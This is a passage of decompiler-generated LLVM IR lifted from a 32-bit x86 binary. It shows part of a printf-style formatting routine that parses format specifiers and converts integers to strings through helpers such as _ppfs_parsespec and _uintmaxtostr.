  store i32 %v4_8051d6a, i32* %v1_8051d6a, align 4
  %v0_8051d6d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d6d

dec_label_pc_8051d6d:                             ; preds = %dec_label_pc_8051d42, %dec_label_pc_8051d6a
  %v0_8052253 = phi i32 [ %v0_8051d46, %dec_label_pc_8051d42 ], [ %v0_8051d6d.pre, %dec_label_pc_8051d6a ]
  %v1_8051d6d = inttoptr i32 %v0_8052253 to i8*
  %v2_8051d6d = load i8, i8* %v1_8051d6d, align 1
  %v3_8051d6d = icmp eq i8 %v2_8051d6d, 0
  %v4_8051d6d = icmp slt i8 %v2_8051d6d, 0
  store i1 %v4_8051d6d, i1* %sf.global-to-local, align 1
  br i1 %v3_8051d6d, label %dec_label_pc_8052262, label %dec_label_pc_8051d76

dec_label_pc_8051d76:                             ; preds = %dec_label_pc_8051d6d
  %v1_8051d76 = add i32 %v0_8052253, 1
  %v2_8051d76 = inttoptr i32 %v1_8051d76 to i8*
  %v3_8051d76 = load i8, i8* %v2_8051d76, align 1
  %v4_8051d76 = add i8 %v3_8051d76, -37
  %v12_8051d76 = icmp eq i8 %v4_8051d76, 0
  %v13_8051d76 = icmp slt i8 %v4_8051d76, 0
  store i1 %v13_8051d76, i1* %sf.global-to-local, align 1
  store i32 %v1_8051d76, i32* %edx.global-to-local, align 4
  br i1 %v12_8051d76, label %dec_label_pc_8052253, label %dec_label_pc_8051d83

dec_label_pc_8051d83:                             ; preds = %dec_label_pc_8051d76
  %v1_8051d83 = load i32, i32* @esp, align 4
  %v2_8051d83 = add i32 %v1_8051d83, 16
  %v3_8051d83 = inttoptr i32 %v2_8051d83 to i32*
  store i32 %v1_8051d76, i32* %v3_8051d83, align 4
  %v0_8051d87 = load i32, i32* @esp, align 4
  %v1_8051d87 = add i32 %v0_8051d87, 340
  %v2_8051d87 = inttoptr i32 %v1_8051d87 to i32*
  store i32 0, i32* %v2_8051d87, align 4
  %v0_8051d92 = load i32, i32* @esp, align 4
  %v1_8051d92 = add i32 %v0_8051d92, -12
  %v10_8051d92 = icmp slt i32 %v1_8051d92, 0
  store i1 %v10_8051d92, i1* %sf.global-to-local, align 1
  %v1_8051d95 = add i32 %v0_8051d92, 16
  store i32 %v1_8051d95, i32* @ebx, align 4
  %v2_8051d99 = add i32 %v0_8051d92, -16
  %v3_8051d99 = inttoptr i32 %v2_8051d99 to i32*
  store i32 %v1_8051d95, i32* %v3_8051d99, align 4
  %v0_8051d9a = load i32, i32* %stack_var_-364, align 4
  %v1_8051d9a = inttoptr i32 %v0_8051d9a to i32*
  %v2_8051d9a = call i32 @_ppfs_parsespec(i32* %v1_8051d9a)
  store i32 %v2_8051d9a, i32* %eax.global-to-local, align 4
  %v0_8051d9f = load i32, i32* @ebx, align 4
  %v1_8051d9f = load i32, i32* @esp, align 4
  %v2_8051d9f = inttoptr i32 %v1_8051d9f to i32*
  store i32 %v0_8051d9f, i32* %v2_8051d9f, align 4
  %v0_8051da2 = load i32, i32* %stack_var_-364, align 4
  %v1_8051da2 = call i32 @_ppfs_setargs(i32 %v0_8051da2)
  store i32 %v1_8051da2, i32* %eax.global-to-local, align 4
  %v0_8051da7 = load i32, i32* @esp, align 4
  %v1_8051da7 = add i32 %v0_8051da7, 70
  %v2_8051da7 = inttoptr i32 %v1_8051da7 to i8*
  %v3_8051da7 = load i8, i8* %v2_8051da7, align 1
  %v4_8051da7 = zext i8 %v3_8051da7 to i32
  store i32 %v4_8051da7, i32* @edi, align 4
  %v1_8051dac = add i32 %v0_8051da7, 16
  %v1_8051daf = add i32 %v0_8051da7, 56
  %v2_8051daf = inttoptr i32 %v1_8051daf to i32*
  %v3_8051daf = load i32, i32* %v2_8051daf, align 4
  %v5_8051daf = icmp slt i32 %v3_8051daf, 0
  store i1 %v5_8051daf, i1* %sf.global-to-local, align 1
  %v1_8051db4 = add i32 %v0_8051da7, 112
  store i32 %v1_8051db4, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_8051daf, 1
  br i1 %tmp66, label %dec_label_pc_8051dc1, label %dec_label_pc_8051dba

dec_label_pc_8051dba:                             ; preds = %dec_label_pc_8051d83
  %v2_8051dba = zext i8 %v3_8051da7 to i32
  %v3_8051dba = mul nuw nsw i32 %v2_8051dba, 12
  store i32 %v3_8051dba, i32* %eax.global-to-local, align 4
  %v2_8051dbd = add i32 %v0_8051da7, 100
  %v3_8051dbd = add i32 %v2_8051dbd, %v3_8051dba
  store i32 %v3_8051dbd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051dc1

dec_label_pc_8051dc1:                             ; preds = %dec_label_pc_8051d83, %dec_label_pc_8051dba
  %v0_8051dc927 = phi i32 [ %v1_8051db4, %dec_label_pc_8051d83 ], [ %v3_8051dbd, %dec_label_pc_8051dba ]
  %v1_8051dc1 = add i32 %v0_8051da7, 60
  %v2_8051dc1 = inttoptr i32 %v1_8051dc1 to i32*
  %v3_8051dc1 = load i32, i32* %v2_8051dc1, align 4
  store i32 %v3_8051dc1, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8051dd472 = sub i32 0, %v3_8051dc1
  %v10_8051dd475 = and i32 %v3_8051dc1, %v2_8051dd472
  %v11_8051dd476 = icmp slt i32 %v10_8051dd475, 0
  %v13_8051dd477 = icmp slt i32 %v2_8051dd472, 0
  %v2_8051dd678 = icmp eq i1 %v13_8051dd477, %v11_8051dd476
  br i1 %v2_8051dd678, label %dec_label_pc_8051dd8, label %dec_label_pc_8051dc9

dec_label_pc_8051dc9:                             ; preds = %dec_label_pc_8051dc1, %dec_label_pc_8051dc9
  %v0_8051dd882 = phi i32 [ %v0_8051dd8, %dec_label_pc_8051dc9 ], [ %v1_8051dac, %dec_label_pc_8051dc1 ]
  %v2_8051dc981 = phi i32 [ %v1_8051dd3, %dec_label_pc_8051dc9 ], [ 0, %dec_label_pc_8051dc1 ]
  %v0_8051dc980 = phi i32 [ %v1_8051dd0, %dec_label_pc_8051dc9 ], [ %v0_8051dc927, %dec_label_pc_8051dc1 ]
  %v3_8051dc9 = mul i32 %v2_8051dc981, 4
  %v4_8051dc9 = add i32 %v3_8051dc9, 344
  %v5_8051dc9 = add i32 %v4_8051dc9, %v0_8051dd882
  %v6_8051dc9 = inttoptr i32 %v5_8051dc9 to i32*
  store i32 %v0_8051dc980, i32* %v6_8051dc9, align 4
  %v0_8051dd0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051dd0 = add i32 %v0_8051dd0, 12
  store i32 %v1_8051dd0, i32* %edx.global-to-local, align 4
  %v0_8051dd3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051dd3 = add i32 %v0_8051dd3, 1
  %v1_8051dd4.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_8051dd3, i32* %eax.global-to-local, align 4
  %v2_8051dd4 = sub i32 %v1_8051dd3, %v1_8051dd4.pre
  %v8_8051dd4 = xor i32 %v1_8051dd3, %v1_8051dd4.pre
  %v9_8051dd4 = xor i32 %v2_8051dd4, %v1_8051dd3
  %v10_8051dd4 = and i32 %v9_8051dd4, %v8_8051dd4
  %v11_8051dd4 = icmp slt i32 %v10_8051dd4, 0
  %v13_8051dd4 = icmp slt i32 %v2_8051dd4, 0
  %v2_8051dd6 = icmp eq i1 %v13_8051dd4, %v11_8051dd4
  %v0_8051dd8 = load i32, i32* @esp, align 4
  br i1 %v2_8051dd6, label %dec_label_pc_8051dd8, label %dec_label_pc_8051dc9

dec_label_pc_8051dd8:                             ; preds = %dec_label_pc_8051dc9, %dec_label_pc_8051dc1
  %v0_8051dd8.lcssa = phi i32 [ %v1_8051dac, %dec_label_pc_8051dc1 ], [ %v0_8051dd8, %dec_label_pc_8051dc9 ]
  %v1_8051dd8 = add i32 %v0_8051dd8.lcssa, 48
  %v2_8051dd8 = inttoptr i32 %v1_8051dd8 to i32*
  %v3_8051dd8 = load i32, i32* %v2_8051dd8, align 4
  store i32 %v3_8051dd8, i32* @ecx, align 4
  %v1_8051ddc = icmp eq i32 %v3_8051dd8, 0
  %v2_8051ddc = icmp slt i32 %v3_8051dd8, 0
  store i1 %v2_8051ddc, i1* %sf.global-to-local, align 1
  %v1_8051dde = icmp eq i1 %v1_8051ddc, false
  br i1 %v1_8051dde, label %dec_label_pc_8051e06, label %dec_label_pc_8051de0

dec_label_pc_8051de0:                             ; preds = %dec_label_pc_8051dd8
  %v1_8051de0 = inttoptr i32 %v0_8051dd8.lcssa to i32*
  %v2_8051de0 = load i32, i32* %v1_8051de0, align 4
  store i32 %v2_8051de0, i32* %eax.global-to-local, align 4
  %v1_8051de3 = ashr i32 %v2_8051de0, 31
  store i32 %v1_8051de3, i32* %edx.global-to-local, align 4
  %v2_8051de4 = add i32 %v0_8051dd8.lcssa, -4
  %v3_8051de4 = inttoptr i32 %v2_8051de4 to i32*
  store i32 %v1_8051de3, i32* %v3_8051de4, align 4
  %v0_8051de5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051de5 = add i32 %v0_8051dd8.lcssa, -8
  %v3_8051de5 = inttoptr i32 %v2_8051de5 to i32*
  store i32 %v0_8051de5, i32* %v3_8051de5, align 4
  %v1_8051de6 = add i32 %v0_8051dd8.lcssa, 32
  %v2_8051de6 = inttoptr i32 %v1_8051de6 to i32*
  %v3_8051de6 = load i32, i32* %v2_8051de6, align 4
  %v1_8051dea = and i32 %v3_8051de6, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8051dea, i32* %eax.global-to-local, align 4
  %v2_8051def = add i32 %v0_8051dd8.lcssa, -12
  %v3_8051def = inttoptr i32 %v2_8051def to i32*
  store i32 %v1_8051dea, i32* %v3_8051def, align 4
  %v1_8051df0 = add i32 %v0_8051dd8.lcssa, 344
  %v2_8051df0 = inttoptr i32 %v1_8051df0 to i32*
  %v3_8051df0 = load i32, i32* %v2_8051df0, align 4
  store i32 %v3_8051df0, i32* %eax.global-to-local, align 4
  %v1_8051df7 = inttoptr i32 %v3_8051df0 to i32*
  %v2_8051df7 = load i32, i32* %v1_8051df7, align 4
  %v4_8051df7 = add i32 %v0_8051dd8.lcssa, -16
  %v5_8051df7 = inttoptr i32 %v4_8051df7 to i32*
  store i32 %v2_8051df7, i32* %v5_8051df7, align 4
  %v0_8051df9 = call i32 @_store_inttype()
  store i32 %v0_8051df9, i32* %eax.global-to-local, align 4
  %v0_8051dfe = load i32, i32* @esp, align 4
  %v1_8051dfe = add i32 %v0_8051dfe, 16
  %v7_8051dfe = icmp slt i32 %v1_8051dfe, 0
  store i1 %v7_8051dfe, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052248

dec_label_pc_8051e06:                             ; preds = %dec_label_pc_8051dd8
  %v1_8051e06 = add i32 %v3_8051dd8, -7
  %v5_8051e06 = icmp ult i32 %v3_8051dd8, 7
  %v9_8051e06 = icmp eq i32 %v1_8051e06, 0
  %v10_8051e06 = icmp slt i32 %v1_8051e06, 0
  store i1 %v10_8051e06, i1* %sf.global-to-local, align 1
  %v2_8051e09 = or i1 %v5_8051e06, %v9_8051e06
  br i1 %v2_8051e09, label %dec_label_pc_8051e0f, label %dec_label_pc_8051f73

dec_label_pc_8051e0f:                             ; preds = %dec_label_pc_8051e06
  %v1_8051e0f = add i32 %v3_8051dd8, 134586960
  %v2_8051e0f = inttoptr i32 %v1_8051e0f to i8*
  %v3_8051e0f = load i8, i8* %v2_8051e0f, align 1
  %v4_8051e0f = sext i8 %v3_8051e0f to i32
  store i32 %v4_8051e0f, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8051e1b = icmp eq i8 %v3_8051e0f, 10
  %v10_8051e1b = icmp slt i8 %v3_8051e0f, 10
  store i1 %v10_8051e1b, i1* %sf.global-to-local, align 1
  %v1_8051e1e = icmp eq i1 %v9_8051e1b, false
  br i1 %v1_8051e1e, label %dec_label_pc_8051e3e, label %dec_label_pc_8051e20

dec_label_pc_8051e20:                             ; preds = %dec_label_pc_8051e0f
  %v1_8051e20 = add i32 %v0_8051dd8.lcssa, 32
  %v2_8051e20 = inttoptr i32 %v1_8051e20 to i32*
  %v3_8051e20 = load i32, i32* %v2_8051e20, align 4
  store i32 %v3_8051e20, i32* %eax.global-to-local, align 4
  %v1_8051e26 = udiv i32 %v3_8051e20, 32
  %tmp67 = urem i32 %v1_8051e26, 2
  %tmp68 = sub nsw i32 45, %tmp67
  %v2_8051e36 = or i32 %tmp68, 128
  store i32 %v2_8051e36, i32* %edx.global-to-local, align 4
  %v2_8051e39 = and i32 %v3_8051e20, 64
  %v3_8051e39 = icmp eq i32 %v2_8051e39, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8051e3b = icmp eq i1 %v3_8051e39, false
  %v4_8051e3b = select i1 %v1_8051e3b, i32 %v2_8051e36, i32 %tmp68
  store i32 %v4_8051e3b, i32* @ebx, align 4
  br label %dec_label_pc_8051e3e

dec_label_pc_8051e3e:                             ; preds = %dec_label_pc_8051e0f, %dec_label_pc_8051e20
  %v1_8051e3e = add i32 %v3_8051dd8, -5
  %v5_8051e3e = icmp ult i32 %v3_8051dd8, 5
  %v9_8051e3e = icmp eq i32 %v1_8051e3e, 0
  %v10_8051e3e = icmp slt i32 %v1_8051e3e, 0
  store i1 %v10_8051e3e, i1* %sf.global-to-local, align 1
  %v2_8051e41 = or i1 %v5_8051e3e, %v9_8051e3e
  br i1 %v2_8051e41, label %dec_label_pc_8051e43, label %dec_label_pc_8051e5b

dec_label_pc_8051e43:                             ; preds = %dec_label_pc_8051e3e
  %v1_8051e43 = add i32 %v3_8051dd8, -3
  %v9_8051e43 = icmp eq i32 %v1_8051e43, 0
  %v10_8051e43 = icmp slt i32 %v1_8051e43, 0
  store i1 %v10_8051e43, i1* %sf.global-to-local, align 1
  %v1_8051e46 = icmp eq i1 %v9_8051e43, false
  br i1 %v1_8051e46, label %dec_label_pc_8051e4f, label %dec_label_pc_8051e48

dec_label_pc_8051e48:                             ; preds = %dec_label_pc_8051e43
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8051e5d

dec_label_pc_8051e4f:                             ; preds = %dec_label_pc_8051e43
  %v1_8051e4f = add i32 %v3_8051dd8, -1
  %v9_8051e4f = icmp eq i32 %v1_8051e4f, 0
  %v10_8051e4f = icmp slt i32 %v1_8051e4f, 0
  store i1 %v10_8051e4f, i1* %sf.global-to-local, align 1
  br i1 %v9_8051e4f, label %dec_label_pc_8051e62, label %dec_label_pc_8051e5d

dec_label_pc_8051e5b:                             ; preds = %dec_label_pc_8051e3e
  %v1_8051e5b = sub nsw i32 0, %v4_8051e0f
  %v7_8051e5b = icmp sgt i8 %v3_8051e0f, 0
  store i1 %v7_8051e5b, i1* %sf.global-to-local, align 1
  store i32 %v1_8051e5b, i32* @esi, align 4
  br label %dec_label_pc_8051e5d

dec_label_pc_8051e5d:                             ; preds = %dec_label_pc_8051e4f, %dec_label_pc_8051e48, %dec_label_pc_8051e5b
  br label %dec_label_pc_8051e62

dec_label_pc_8051e62:                             ; preds = %dec_label_pc_8051e4f, %dec_label_pc_8051e5d
  %storemerge = phi i32 [ 11, %dec_label_pc_8051e5d ], [ 6, %dec_label_pc_8051e4f ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_8051e62 = add i32 %v0_8051dd8.lcssa, 20
  %v2_8051e62 = inttoptr i32 %v1_8051e62 to i32*
  %v3_8051e62 = load i32, i32* %v2_8051e62, align 4
  %v5_8051e62 = icmp slt i32 %v3_8051e62, 0
  store i1 %v5_8051e62, i1* %sf.global-to-local, align 1
  %v1_8051e67 = add i32 %v0_8051dd8.lcssa, 7
  %v2_8051e67 = inttoptr i32 %v1_8051e67 to i8*
  store i8 32, i8* %v2_8051e67, align 1
  %v0_8051e6c = load i1, i1* %sf.global-to-local, align 1
  %v1_8051e6c = icmp eq i1 %v0_8051e6c, false
  br i1 %v1_8051e6c, label %dec_label_pc_8051e76, label %dec_label_pc_8051e6e

dec_label_pc_8051e6e:                             ; preds = %dec_label_pc_8051e62
  %v0_8051e6e = load i32, i32* @esp, align 4
  %v1_8051e6e = add i32 %v0_8051e6e, 36
  %v2_8051e6e = inttoptr i32 %v1_8051e6e to i8*
  %v3_8051e6e = load i8, i8* %v2_8051e6e, align 1
  %v4_8051e6e = zext i8 %v3_8051e6e to i32
  %v5_8051e6e = load i32, i32* %edx.global-to-local, align 4
  %v6_8051e6e = and i32 %v5_8051e6e, -256
  %v7_8051e6e = or i32 %v6_8051e6e, %v4_8051e6e
  store i32 %v7_8051e6e, i32* %edx.global-to-local, align 4
  %v3_8051e72 = add i32 %v0_8051e6e, 7
  %v4_8051e72 = inttoptr i32 %v3_8051e72 to i8*
  store i8 %v3_8051e6e, i8* %v4_8051e72, align 1
  br label %dec_label_pc_8051e76

dec_label_pc_8051e76:                             ; preds = %dec_label_pc_8051e62, %dec_label_pc_8051e6e
  %v1_8051e76 = add i32 %v3_8051dd8, -1
  %v8_8051e76 = icmp eq i32 %v1_8051e76, 0
  %v9_8051e76 = icmp slt i32 %v1_8051e76, 0
  store i1 %v9_8051e76, i1* %sf.global-to-local, align 1
  store i32 %v1_8051e76, i32* %ecx.global-to-local, align 4
  %v0_8051e77 = load i32, i32* @esp, align 4
  %v1_8051e77 = add i32 %v0_8051e77, 344
  %v2_8051e77 = inttoptr i32 %v1_8051e77 to i32*
  %v3_8051e77 = load i32, i32* %v2_8051e77, align 4
  store i32 %v3_8051e77, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_8051e8f.pre = load i32, i32* @edi, align 4
  br i1 %v8_8051e76, label %dec_label_pc_8051e8f, label %dec_label_pc_8051e85

dec_label_pc_8051e85:                             ; preds = %dec_label_pc_8051e76
  %v2_8051e85 = mul i32 %v0_8051e8f.pre, 4
  %v3_8051e85 = add i32 %v0_8051e77, 52
  %v4_8051e85 = add i32 %v3_8051e85, %v2_8051e85
  %v5_8051e85 = inttoptr i32 %v4_8051e85 to i32*
  %v6_8051e85 = load i32, i32* %v5_8051e85, align 4
  %v1_8051e89 = and i32 %v6_8051e85, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8051e89, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051e8f

dec_label_pc_8051e8f:                             ; preds = %dec_label_pc_8051e76, %dec_label_pc_8051e85
  %v2_8051e8f = add i32 %v0_8051e77, -4
  %v3_8051e8f = inttoptr i32 %v2_8051e8f to i32*
  store i32 %v0_8051e8f.pre, i32* %v3_8051e8f, align 4
  %v0_8051e90 = load i32, i32* @esi, align 4
  %v2_8051e90 = add i32 %v0_8051e77, -8
  %v3_8051e90 = inttoptr i32 %v2_8051e90 to i32*
  store i32 %v0_8051e90, i32* %v3_8051e90, align 4
  %v0_8051e91 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051e91 = add i32 %v0_8051e77, -12
  %v3_8051e91 = inttoptr i32 %v2_8051e91 to i32*
  store i32 %v0_8051e91, i32* %v3_8051e91, align 4
  %v0_8051e92 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051e92 = add i32 %v0_8051e77, -16
  %v3_8051e92 = inttoptr i32 %v2_8051e92 to i32*
  store i32 %v0_8051e92, i32* %v3_8051e92, align 4
  %v0_8051e93 = call i32 @_load_inttype()
  %v0_8051e98 = load i32, i32* @ebx, align 4
  %v1_8051e98 = load i32, i32* @esp, align 4
  %v2_8051e98 = inttoptr i32 %v1_8051e98 to i32*
  store i32 %v0_8051e98, i32* %v2_8051e98, align 4
  %v0_8051e9b = load i32, i32* @esi, align 4
  %v1_8051e9b = load i32, i32* @esp, align 4
  %v2_8051e9b = add i32 %v1_8051e9b, -4
  %v3_8051e9b = inttoptr i32 %v2_8051e9b to i32*
  store i32 %v0_8051e9b, i32* %v3_8051e9b, align 4
  %v0_8051e9c = load i32, i32* @edx, align 4
  %v2_8051e9c = add i32 %v1_8051e9b, -8
  %v3_8051e9c = inttoptr i32 %v2_8051e9c to i32*
  store i32 %v0_8051e9c, i32* %v3_8051e9c, align 4
  %v2_8051e9d = add i32 %v1_8051e9b, -12
  %v3_8051e9d = inttoptr i32 %v2_8051e9d to i32*
  store i32 %v0_8051e93, i32* %v3_8051e9d, align 4
  %v1_8051e9e = add i32 %v1_8051e9b, 347
  store i32 %v1_8051e9e, i32* %eax.global-to-local, align 4
  %v2_8051ea5 = add i32 %v1_8051e9b, -16
  %v3_8051ea5 = inttoptr i32 %v2_8051ea5 to i32*
  store i32 %v1_8051e9e, i32* %v3_8051ea5, align 4
  %v0_8051ea6 = load i32, i32* %stack_var_-364, align 4
  %v5_8051ea6 = inttoptr i32 %v0_8051ea6 to i8*
  %v6_8051ea6 = call i32 @_uintmaxtostr(i8* %v5_8051ea6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8051ea6, i32* %eax.global-to-local, align 4
  %v0_8051eab = load i32, i32* @esp, align 4
  %v1_8051eab = add i32 %v0_8051eab, 32
  %v1_8051eae = add i32 %v0_8051eab, 80
  %v2_8051eae = inttoptr i32 %v1_8051eae to i32*
  %v3_8051eae = load i32, i32* %v2_8051eae, align 4
  %v4_8051eae = add i32 %v3_8051eae, -5
  %v8_8051eae = icmp ult i32 %v3_8051eae, 5
  %v12_8051eae = icmp eq i32 %v4_8051eae, 0
  %v13_8051eae = icmp slt i32 %v4_8051eae, 0
  store i1 %v13_8051eae, i1* %sf.global-to-local, align 1
  store i32 %v6_8051ea6, i32* @edi, align 4
  %v2_8051eb5 = or i1 %v8_8051eae, %v12_8051eae
  br i1 %v2_8051eb5, label %dec_label_pc_8051edf, label %dec_label_pc_8051eb7

dec_label_pc_8051eb7:                             ; preds = %dec_label_pc_8051e8f
  %v7_8051ea6 = inttoptr i32 %v6_8051ea6 to i8*
  %v3_8051eb7 = load i8, i8* %v7_8051ea6, align 1
  %v4_8051eb7 = add i8 %v3_8051eb7, -45
  %v12_8051eb7 = icmp eq i8 %v4_8051eb7, 0
  %v13_8051eb7 = icmp slt i8 %v4_8051eb7, 0
  store i1 %v13_8051eb7, i1* %sf.global-to-local, align 1
  %v1_8051eba = icmp eq i1 %v12_8051eb7, false
  %v1_8051ec9 = add i32 %v0_8051eab, 64
  %v2_8051ec9 = inttoptr i32 %v1_8051ec9 to i32*
  %v3_8051ec9 = load i32, i32* %v2_8051ec9, align 4
  br i1 %v1_8051eba, label %dec_label_pc_8051ec9, label %dec_label_pc_8051ebc

dec_label_pc_8051ebc:                             ; preds = %dec_label_pc_8051eb7
  %v4_8051ebc = or i32 %v3_8051ec9, 2
  store i32 %v4_8051ebc, i32* %v2_8051ec9, align 4
  %v0_8051ec1 = load i32, i32* @edi, align 4
  %v1_8051ec1 = add i32 %v0_8051ec1, 1
  %v9_8051ec1 = icmp slt i32 %v1_8051ec1, 0
  store i1 %v9_8051ec1, i1* %sf.global-to-local, align 1
  store i32 %v1_8051ec1, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8051edf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051edf

dec_label_pc_8051ec9:                             ; preds = %dec_label_pc_8051eb7
  store i32 %v3_8051ec9, i32* %eax.global-to-local, align 4
  %v2_8051ecd = and i32 %v3_8051ec9, 2
  %v3_8051ecd = icmp eq i32 %v2_8051ecd, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_8051ecd, label %dec_label_pc_8051ed5, label %dec_label_pc_8051ed1

dec_label_pc_8051ed1:                             ; preds = %dec_label_pc_8051ec9
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051edf

dec_label_pc_8051ed5:                             ; preds = %dec_label_pc_8051ec9
  %v2_8051ed5 = urem i32 %v3_8051ec9, 2
  %v3_8051ed5 = icmp eq i32 %v2_8051ed5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_8051edc = icmp eq i1 %v3_8051ed5, false
  %v2_8051edc = load i32, i32* @ebp, align 4
  %v4_8051edc = select i1 %v1_8051edc, i32 4, i32 %v2_8051edc
  store i32 %v4_8051edc, i32* @ebp, align 4
  br label %dec_label_pc_8051edf

dec_label_pc_8051edf:                             ; preds = %dec_label_pc_8051e8f, %dec_label_pc_8051ed1, %dec_label_pc_8051ebc, %dec_label_pc_8051ed5
  %v0_8051f31 = phi i32 [ %v6_8051ea6, %dec_label_pc_8051e8f ], [ %v6_8051ea6, %dec_label_pc_8051ed1 ], [ %v1_8051ec1, %dec_label_pc_8051ebc ], [ %v6_8051ea6, %dec_label_pc_8051ed5 ]
  %v0_8051f41 = phi i32 [ %v1_8051eab, %dec_label_pc_8051e8f ], [ %v1_8051eab, %dec_label_pc_8051ed1 ], [ %v0_8051edf.pre, %dec_label_pc_8051ebc ], [ %v1_8051eab, %dec_label_pc_8051ed5 ]
  %v1_8051edf = add i32 %v0_8051f41, 20
  %v2_8051edf = inttoptr i32 %v1_8051edf to i32*
  %v3_8051edf = load i32, i32* %v2_8051edf, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_8051ee3 = sub i32 204, %v0_8051f31
  %v2_8051eef = add i32 %v1_8051ee3, %v0_8051f41
  %v1_8051ef1 = add i32 %v2_8051eef, 127
  store i32 %v1_8051ef1, i32* @esi, align 4
  %v2_8051ef4 = icmp slt i32 %v3_8051edf, 0
  store i1 %v2_8051ef4, i1* %sf.global-to-local, align 1
  %v3_8051ef6 = select i1 %v2_8051ef4, i32 1, i32 %v3_8051edf
  store i32 %v3_8051ef6, i32* %ecx.global-to-local, align 4
  %v1_8051ef9 = add i32 %v0_8051f41, 32
  %v2_8051ef9 = inttoptr i32 %v1_8051ef9 to i8*
  %v3_8051ef9 = load i8, i8* %v2_8051ef9, align 1
  %v4_8051ef9 = and i8 %v3_8051ef9, 16
  %v5_8051ef9 = icmp eq i8 %v4_8051ef9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_8051ef9, label %dec_label_pc_8051f31, label %dec_label_pc_8051f00

dec_label_pc_8051f00:                             ; preds = %dec_label_pc_8051edf
  %v1_8051f00 = add i32 %v0_8051f41, 48
  %v2_8051f00 = inttoptr i32 %v1_8051f00 to i32*
  %v3_8051f00 = load i32, i32* %v2_8051f00, align 4
  store i32 %v3_8051f00, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i32 %v3_8051f00, 3
  %v3_8051f09 = load i32, i32* @ebp, align 4
  %v5_8051f09 = select i1 %tmp69, i32 6, i32 %v3_8051f09
  store i32 %v5_8051f09, i32* @ebp, align 4
  %v1_8051f0c = add i32 %v3_8051f00, -3
  %v9_8051f0c = icmp eq i32 %v1_8051f0c, 0
  %v10_8051f0c = icmp slt i32 %v1_8051f0c, 0
  store i1 %v10_8051f0c, i1* %sf.global-to-local, align 1
  %v1_8051f0f = icmp eq i1 %v9_8051f0c, false
  br i1 %v1_8051f0f, label %dec_label_pc_8051f18, label %dec_label_pc_8051f11

dec_label_pc_8051f11:                             ; preds = %dec_label_pc_8051f00
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8051f31

dec_label_pc_8051f18:                             ; preds = %dec_label_pc_8051f00
  %v1_8051f18 = add i32 %v3_8051f00, -4
  %v9_8051f18 = icmp eq i32 %v1_8051f18, 0
  %v10_8051f18 = icmp slt i32 %v1_8051f18, 0
  store i1 %v10_8051f18, i1* %sf.global-to-local, align 1
  %v1_8051f1b = icmp eq i1 %v9_8051f18, false
  br i1 %v1_8051f1b, label %dec_label_pc_8051f31, label %dec_label_pc_8051f1d

dec_label_pc_8051f1d:                             ; preds = %dec_label_pc_8051f18
  %v2_8051f1d = sub i32 %v3_8051ef6, %v1_8051ef1
  %v7_8051f1d = icmp ult i32 %v3_8051ef6, %v1_8051ef1
  %v12_8051f1d = icmp eq i32 %v2_8051f1d, 0
  %v13_8051f1d = icmp slt i32 %v2_8051f1d, 0
  store i1 %v13_8051f1d, i1* %sf.global-to-local, align 1
  %v2_8051f1f = or i1 %v7_8051f1d, %v12_8051f1d
  br i1 %v2_8051f1f, label %dec_label_pc_8051f21, label %dec_label_pc_8051f31

dec_label_pc_8051f21:                             ; preds = %dec_label_pc_8051f1d
  %v1_8051f21 = inttoptr i32 %v0_8051f31 to i8*
  %v2_8051f21 = load i8, i8* %v1_8051f21, align 1
  %v3_8051f21 = add i8 %v2_8051f21, -48
  %v8_8051f21 = icmp eq i8 %v3_8051f21, 0
  %v9_8051f21 = icmp slt i8 %v3_8051f21, 0
  store i1 %v9_8051f21, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051f21, label %dec_label_pc_8051f31, label %dec_label_pc_8051f2b

dec_label_pc_8051f2b:                             ; preds = %dec_label_pc_8051f21
  %v1_8051f2b = add i32 %v2_8051eef, 128
  store i32 %v1_8051f2b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051f31

dec_label_pc_8051f31:                             ; preds = %dec_label_pc_8051f1d, %dec_label_pc_8051f21, %dec_label_pc_8051f18, %dec_label_pc_8051edf, %dec_label_pc_8051f11, %dec_label_pc_8051f2b
